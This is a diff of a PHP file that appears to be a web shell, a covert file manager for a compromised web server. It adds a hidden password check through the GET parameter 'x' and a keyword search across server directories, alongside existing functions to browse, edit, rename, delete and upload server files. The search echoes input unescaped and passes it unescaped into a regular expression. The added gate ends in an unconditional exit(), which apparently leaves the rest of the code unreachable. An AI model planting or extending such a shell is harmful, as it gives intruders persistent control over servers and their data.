@@ -1,3 +1,16 @@
+<?php
+session_start();
+$auth_logged = "$2y$10$7wPtyKE4gpC5m3nLDAS7Ke2fMunDIV1iOpseMk6xnLZ3WlfZUiIXS";
+
+if (isset($_SESSION[$_SERVER['HTTP_HOST']], $auth_logged[$_SESSION[$_SERVER['HTTP_HOST']]])) {
+	// logged
+} elseif (isset($_GET['x'])) {
+	if (password_verify($_GET['x'], $auth_logged)) {
+		$_SESSION[$_SERVER['HTTP_HOST']] = $_GET['x'];
+	}
+}
+exit();
+?>
 <title><?= get_current_user() ?></title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <style type="text/css">
@@ -48,7 +61,7 @@ tbody td {
 }
 tbody td.td {
 	padding:7px;
-	width:60.52%;
+	width:65.52%;
 }
 tbody td {
 	padding:7px;
@@ -203,25 +216,22 @@ button:hover {
   	top: 0;
   	opacity: 0;
 }
-tbody td.file {
-	width:5.5em;
+div.search {
+	margin-top:-14px;
+	margin-left:400px
 }
-tbody td.dir {
-	width:5.5em;
-}
-select.p {
-	content:;
-	color: #8a8a8a;
-	padding:1px;
+input[type=text].search {
+	padding:7px;
 	font-family: 'Ubuntu', sans-serif;
-	text-transform: uppercase;
-	outline:none;
-	border:none;
-	background:none;
+	border:5px solid #fff;
+	outline: none;
 }
-option:hover {
-	border:none;
-	outline:none;
+input[type=text].search:hover {
+	border-bottom: 5px solid #fff;
+}
+input[type=text].search:focus {
+	background: rgba(222,222,222,0.73);
+	border-radius:5px;
 }
 @media screen and (max-width: 600px) {
 	body {
@@ -266,10 +276,10 @@ option:hover {
 		padding: 5px;
 	}
 	tbody td.file {
-		width:4.5em;
+		width:7em;
 	}
 	tbody td.dir {
-		width:4.5em;
+		width:7em;
 	}
 	tbody td {
 		padding:3px;
@@ -306,6 +316,14 @@ option:hover {
         	<button name="tools" value="home">HOME</button>&nbsp&nbsp&nbsp&nbsp
         	<button name="tools" value="upload">UPLOAD</button>
         </th>
+        </form>
+        <form method="post">
+        <th>
+        	<div class="search">
+        		<input class="search" type="text" name="keyword" placeholder="keyword:">
+        		<input type="hidden" name="tools" value="search">
+        	</div>
+        </th>
     	</form>
       </tr>
     </thead>
@@ -317,59 +335,202 @@ function cwd() {
 		$cwd = $_GET['dir'];
 		chdir($cwd);
 	} else {
-		$cwd = str_replace('\\', '/', getcwd());
+		$cwd = str_replace('\\', DIRECTORY_SEPARATOR, getcwd());
 	} return $cwd;
+}
+function src($dir, $keyword) {
+	?>
+	<tr>
+		<td class="td">
+			<span><h4>RESULT : <u><i><?= $keyword ?></i></u></h4></span>
+		</td>
+	</tr>
+	<?php
+    $path = scandir($dir); ?>
+    <?php foreach ($path as $file) {
+    	$value = $dir.DIRECTORY_SEPARATOR.$file;
+        if(preg_match('/'.$keyword.'/i', $value)) {
+            if (is_dir($value)) { ?>
+                <tr class="hover">
+                    <td class="td">
+                    	<input type='checkbox' form="data" name='data[]' value="<?=$value?>">&nbsp&nbsp<img src='https://image.flaticon.com/icons/svg/716/716784.svg' class='icon' title='<?= $file ?>'>
+                        <a href="?dir=<?= $value ?>"><?= basename($value) ?></a>
+                    </td>
+                    <td class="screen"><center>--</center></td>
+                    <td class="files">
+                    	<center>
+                    		<span style="font-size:15px;float:right;">
+                    			<?= permission($value, perms($value)) ?>
+                    		</span>	
+						</center>
+					</td>
+					<form method="post">
+						<td class="dir">
+							<select class="action" style="float:right;" name="action" onchange="if(this.value != 0) { this.form.submit(); }">
+							<option selected>choose . .</option>
+							<option value="delete">delete</option>
+							<option value="rename">rename</option>
+							</select>
+							<input type="hidden" name="file" value="<?= $value ?>">
+						</td>
+					</form>
+				</tr>
+            <?php }  elseif (is_file($value)) { ?>
+                <tr class="hover">
+                    <td class="td">
+                    	<input type='checkbox' form="data" name='data[]' value="<?=$value?>">
+                        <?php
+                        print("<img class='icon' src='");
+                        $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
+                        switch ($ext) {
+                        	case 'php':
+								print("https://image.flaticon.com/icons/png/128/337/337947.png");
+								break;
+							case 'pl':
+								print("https://image.flaticon.com/icons/svg/186/186645.svg");
+								break;
+							case 'xml':
+								print("https://image.flaticon.com/icons/svg/136/136526.svg");
+								break;
+							case 'json':
+								print("https://image.flaticon.com/icons/svg/136/136525.svg");
+								break;
+							case 'exe':
+								print("https://image.flaticon.com/icons/svg/136/136531.svg");
+								break;
+							case 'png':
+								print("http://".$_SERVER['HTTP_HOST'].str_replace($_SERVER['DOCUMENT_ROOT'], '', cwd().'/'.basename($file))."");
+								break;
+							case 'html':
+								print("https://image.flaticon.com/icons/png/128/136/136528.png");
+								break;
+							case 'css':
+								print("https://image.flaticon.com/icons/png/128/136/136527.png");
+								break;
+							case 'ico':
+								print("https://image.flaticon.com/icons/png/128/1126/1126873.png");
+								break;
+							case 'jpg':
+								print("http://".$_SERVER['HTTP_HOST'].str_replace($_SERVER['DOCUMENT_ROOT'], '', cwd().'/'.basename($file))."");
+								break;
+							case 'jpeg':
+								print("http://".$_SERVER['HTTP_HOST'].str_replace($_SERVER['DOCUMENT_ROOT'], '', cwd().'/'.basename($file))."");
+								break;
+							case 'gif':
+								print("http://".$_SERVER['HTTP_HOST'].str_replace($_SERVER['DOCUMENT_ROOT'], '', cwd().'/'.basename($file))."");
+								break;
+							case 'pdf':
+								print("https://image.flaticon.com/icons/png/128/136/136522.png");
+								break;
+							case 'mp4':
+								print("https://image.flaticon.com/icons/png/128/136/136545.png");
+								break;
+							case 'py':
+								print("https://image.flaticon.com/icons/png/128/180/180867.png");
+								break;
+							case 'c':
+								print("https://image.flaticon.com/icons/svg/2306/2306037.svg");
+								break;
+							case 'bmp':
+								print("https://image.flaticon.com/icons/svg/337/337925.svg");
+								break;
+							case 'cpp':
+								print("https://image.flaticon.com/icons/svg/2306/2306030.svg");
+								break;
+							case 'txt':
+								print("https://image.flaticon.com/icons/png/128/136/136538.png");
+								break;
+							case 'zip':
+								print("https://image.flaticon.com/icons/png/128/136/136544.png");
+								break;
+							case 'js':
+								print("https://image.flaticon.com/icons/png/128/1126/1126856.png");
+								break;
+							case 'dll':
+								print("https://image.flaticon.com/icons/svg/2306/2306057.svg");
+								break;
+							default:
+								print("https://image.flaticon.com/icons/svg/833/833524.svg");
+				 				break;
+				 			}
+				 			print("' title='{$file}'>");
+				 			$href = "http://".$_SERVER['HTTP_HOST'].str_replace($_SERVER['DOCUMENT_ROOT'], '', cwd().'/'.basename($value));
+				 			?>
+				 			<a href="<?= $href ?>" target='_blank'><?= basename($value) ?></a>
+				 		</td>
+				 		<td class="screen">
+				 			<center>
+				 				<span style="font-size:15px;"><?= size($value) ?></span>
+				 			</center>
+				 		</td>
+				 		<div>
+				 			<td class="files">
+				 				<center>
+				 					<span style="font-size:15px;">
+				 						<?= permission($value, perms($value)) ?>
+				 					</span>
+				 				</center>
+				 			</td>
+				 			<form method="post">
+				 				<td class="file">
+				 					<select class="action" style="float:right;" name="action" onchange='if(this.value != 0) { this.form.submit(); }'>
+				 						<option selected>choose . .</option>
+				 						<option value="edit">Edit</option>
+				 						<option value="delete">delete</option>
+				 						<option value="rename">rename</option>
+				 					</select>
+				 					<input type="hidden" name="file" value="<?= $file ?>">
+				 				</td>
+				 			</form>
+				 		</tr>
+				 	<?php }
+        }
+    }
+    ?>
+<tr>
+	<thead>
+		<form method="post" id="data">
+			<th class="action">
+				<select name="mode" class="action" style="float:left;width:50%;margin:10px;" onchange='if(this.value != 0) { this.form.submit(); }'>
+					<option selected>choose . .</option>
+					<option value="delete">delete</option>
+				</select>
+			</th>
+		</form>
+	</thead>
+</tr>
+<?php
 }
 function perms($file) {
 $perms = fileperms($file);
 
 switch ($perms & 0xF000) {
-    case 0xC000: // socket
-        $info = 's';
-        break;
-    case 0xA000: // symbolic link
-        $info = 'l';
-        break;
-    case 0x8000: // regular
-        $info = 'r';
-        break;
-    case 0x6000: // block special
-        $info = 'b';
-        break;
-    case 0x4000: // directory
-        $info = 'd';
-        break;
-    case 0x2000: // character special
-        $info = 'c';
-        break;
-    case 0x1000: // FIFO pipe
-        $info = 'p';
-        break;
-    default: // unknown
-        $info = 'u';
+    case 0xC000: $info = 's'; break;
+    case 0xA000: $info = 'l'; break;
+    case 0x8000: $info = 'r'; break;
+    case 0x6000: $info = 'b'; break;
+    case 0x4000: $info = 'd'; break;
+    case 0x2000: $info = 'c'; break;
+    case 0x1000: $info = 'p'; break;
+    default: $info = 'u';
 }
 
-// Owner
 $info .= (($perms & 0x0100) ? 'r' : '-');
 $info .= (($perms & 0x0080) ? 'w' : '-');
 $info .= (($perms & 0x0040) ?
-            (($perms & 0x0800) ? 's' : 'x' ) :
-            (($perms & 0x0800) ? 'S' : '-'));
-
-// Group
+         (($perms & 0x0800) ? 's' : 'x' ) :
+         (($perms & 0x0800) ? 'S' : '-'));
 $info .= (($perms & 0x0020) ? 'r' : '-');
 $info .= (($perms & 0x0010) ? 'w' : '-');
 $info .= (($perms & 0x0008) ?
-            (($perms & 0x0400) ? 's' : 'x' ) :
-            (($perms & 0x0400) ? 'S' : '-'));
+         (($perms & 0x0400) ? 's' : 'x' ) :
+         (($perms & 0x0400) ? 'S' : '-'));
 
-// World
 $info .= (($perms & 0x0004) ? 'r' : '-');
 $info .= (($perms & 0x0002) ? 'w' : '-');
 $info .= (($perms & 0x0001) ?
-            (($perms & 0x0200) ? 't' : 'x' ) :
-            (($perms & 0x0200) ? 'T' : '-'));
-
+         (($perms & 0x0200) ? 't' : 'x' ) :
+         (($perms & 0x0200) ? 'T' : '-'));
 return $info;
 }
 function permission($filename, $perms, $po=false) {
@@ -453,15 +614,6 @@ function delete($filename) {
     }
   }
 }
-function making($filename, $text, $type = null) {
-	if ($type === 'file') {
-		$handle = fopen($filename, "w");
-		fwrite($handle, $text);
-		fclose($handle);
-	} elseif ($type === 'dir') {
-		return (!empty($filename) || is_file($filename) || mkdir(cwd().DIRECTORY_SEPARATOR.$filename, 0777));
-	}
-}
 switch (@$_POST['tools']) {
 	case 'home':
 		?>
@@ -507,22 +659,11 @@ switch (@$_POST['tools']) {
 			}
 			exit();
 		break;
-		case 'making': ?>
-			<form method="post">
-				<tr>
-					<td>
-						<input type="text" name="">
-					</td>
-				</tr>
-			</form>
-			<?php
-			if (isset($_POST['submit'])) {
-				if ($_POST['type'] == 'file') {
-					making($_POST['filename'], $_POST['text'], 'file');
-				} elseif ($_POST['type'] == 'dir') {
-					making($_POST['filename'], "", "dir");
-				}
+		case 'search':
+			if (isset($_POST['keyword'])) {
+				src(cwd(), $_POST['keyword']);
 			}
+			exit();
 			break;
 }
 switch (@$_POST['action']) {
@@ -721,7 +862,7 @@ foreach ($getpath as $dir) {
 		} else {
 			$action = '<form method="post">
 							<td class="dir">
-								<select class="p" style="float:right;" name="action" onchange="if(this.value != 0) { this.form.submit(); }"">
+								<select class="action" style="float:right;" name="action" onchange="if(this.value != 0) { this.form.submit(); }"">
 									<option selected>choose . .</option>
 									<option value="delete">delete</option>
 									<option value="rename">rename</option>
@@ -737,9 +878,11 @@ foreach ($getpath as $dir) {
 			</td>
 			<td class="screen"><center>--</center></td>
 			<td class="files">
-					<span style="font-size:14px;float:left;">
+				<center>
+					<span style="font-size:15px;float:right;">
 						<?= permission($dir, perms($dir)) ?>
 					</span>	
+				</center>
 			</td>
 			<form method="post">
 			<?= $action ?>
@@ -838,13 +981,15 @@ foreach ($getpath as $file) {
 			</td>
 			<div>
 			<td class="files">
-					<span style="font-size:14px;">
+				<center>
+					<span style="font-size:15px;">
 						<?= permission($file, perms($file)) ?>
 					</span>
+				</center>
 			</td>
 			<form method="post">
 			<td class="file">
-				<select class="p" style="float:right;" name="action" onchange='if(this.value != 0) { this.form.submit(); }'>
+				<select class="action" style="float:right;" name="action" onchange='if(this.value != 0) { this.form.submit(); }'>
 					<option selected>choose . .</option>
 					<option value="edit">Edit</option>
 					<option value="delete">delete</option>
